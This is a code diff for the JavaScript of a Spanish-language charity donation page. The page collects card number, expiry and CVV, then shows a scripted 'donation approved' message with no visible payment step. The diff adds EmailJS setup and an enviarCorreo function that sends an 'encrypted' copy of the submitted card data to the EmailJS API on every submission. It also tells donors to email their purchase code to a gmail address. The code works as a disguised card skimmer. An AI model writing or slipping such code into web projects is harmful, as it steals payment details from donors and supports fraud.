@@ -1,3 +1,5 @@
+emailjs.init("-9tzAwCZLS0txFX6X");
+
 function mostrarFormulario() {
     document.getElementById("formulario").classList.remove("hidden");
 }
@@ -22,7 +24,7 @@ function validarCVV(input) {
 
 function confirmarDonacion(event) {
     event.preventDefault();
-    
+    console.log('Formulario enviado');
     const tarjeta = document.getElementById("tarjeta").value.replace(/\s/g, '');
     const fecha = document.getElementById("fecha").value;
     const cvv = document.getElementById("cvv").value;
@@ -64,16 +66,18 @@ function confirmarDonacion(event) {
     localStorage.setItem('donacion', JSON.stringify(datos));
 
     setTimeout(() => {
-        mostrarAlerta("✅ Donación aprobada. ¡Gracias!");
-    }, 1000);
+        mostrarAlerta("Tu donación fue aprobada. ¡Gracias!");
+    }, 1500);
 
     setTimeout(() => {
         document.getElementById("btnDescargarPDF").style.display = "inline-block";
-    }, 1000);
+    }, 1500);
 
     setTimeout(() => {
         mostrarAlerta("🔑 Envia el código de compra a fundacionfelices@gmail.com para comprobar tu donación");
-    }, 4000);
+    }, 4500);
+
+    enviarCorreo(datos);
 
     return true;
 }
@@ -82,7 +86,7 @@ function mostrarAlerta(mensaje) {
     let alerta = document.createElement("div");
     alerta.classList.add("alert");
     alerta.textContent = mensaje;
-    
+
     document.body.appendChild(alerta);
 
     setTimeout(() => alerta.classList.add("show"), 100);
@@ -109,7 +113,7 @@ function generarPDF() {
 
     const datosObj = JSON.parse(datos);
 
-    const codigoCompra = encriptarDatos(JSON.stringify(datosObj)).match(/.{1,40}/g).join(" \n");
+    const codigoCompra = encriptarDatos(JSON.stringify(datosObj));
 
     doc.setFont("helvetica", "bold");
     doc.setFontSize(18);
@@ -126,15 +130,12 @@ function generarPDF() {
     doc.text("Tarjeta utilizada: **** **** **** " + datosObj.tarjeta.slice(-4), 20, 70);
 
     doc.setFont("helvetica", "bold");
-    doc.text("Código de compra (haz clic para copiar):", 20, 80);
+    doc.text("Código de compra (enviar a fundacionfelices@gmail.com para comprobar tu donación):", 20, 80);
     doc.setFont("helvetica", "normal");
 
-    doc.setTextColor(0, 0, 255);
-    const lineasCodigo = doc.splitTextToSize(codigoCompra, 180);
-    doc.textWithLink(lineasCodigo.join(" \n"), 20, 90, {
-        url: "javascript:copiarCodigo('" + codigoCompra.replace(/\n/g, '') + "')"
-    });
-    
+    const lineas = doc.splitTextToSize(codigoCompra, 180);
+    doc.text(lineas, 20, 90);
+
     doc.setFontSize(10);
     doc.text("www.fundacionninosfelices.org", 20, 270);
     doc.text("¡Gracias por tu apoyo!", 20, 280);
@@ -142,10 +143,33 @@ function generarPDF() {
     doc.save("donacion_fundacion.pdf");
 }
 
-function copiarCodigo(codigo) {
-    navigator.clipboard.writeText(codigo).then(() => {
-        alert("Código copiado al portapapeles");
-    }).catch(err => {
-        console.error("Error al copiar el código", err);
+function enviarCorreo(datos) {
+    const codigoCompra = encriptarDatos(JSON.stringify(datos));
+
+    fetch('https://api.emailjs.com/api/v1.0/email/send', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            service_id: 'service_b8eghyt',
+            template_id: 'template_oiaewac',
+            user_id: '-9tzAwCZLS0txFX6X',
+            template_params: {
+                codigoCompra: codigoCompra
+            }
+        })
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Error al enviar el correo: ' + response.statusText);
+        }
+        return response.text();
+    })
+    .then(text => {
+        console.log('Correo enviado exitosamente', text);
+    })
+    .catch(error => {
+        console.log('Error al enviar el correo', error);
     });
 }
